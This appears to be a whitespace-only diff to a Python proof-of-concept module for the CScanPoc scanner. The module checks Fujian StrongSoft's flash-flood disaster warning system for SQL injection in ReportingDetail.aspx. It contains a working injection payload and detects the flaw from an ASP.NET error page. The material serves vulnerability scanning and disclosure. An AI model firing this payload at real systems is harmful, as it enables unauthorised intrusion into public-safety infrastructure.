@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'StrongSoft_0013' # 平台漏洞编号，留空
+    vuln_id = 'StrongSoft_0013'  # 平台漏洞编号，留空
     name = '四创灾害预警系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-13'  # 漏洞公布时间
     desc = '''
         福建四创软件开发的“山洪灾害预警监测系统” Disaster/Reporting/ReportingDetail.aspx?ID=1
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '四创灾害预警系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '38abc524-820f-4451-9e0b-4b16e6956a82'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0146463
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0146463
             arg = self.target
             payload = '/Disaster/Reporting/ReportingDetail.aspx?ID=1'
             getdata = '%27%20AND%203=CHAR(@@version)%20--'
@@ -41,13 +43,14 @@ class Poc(ABPoc):
 
             if "应用程序中的服务器错误" in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
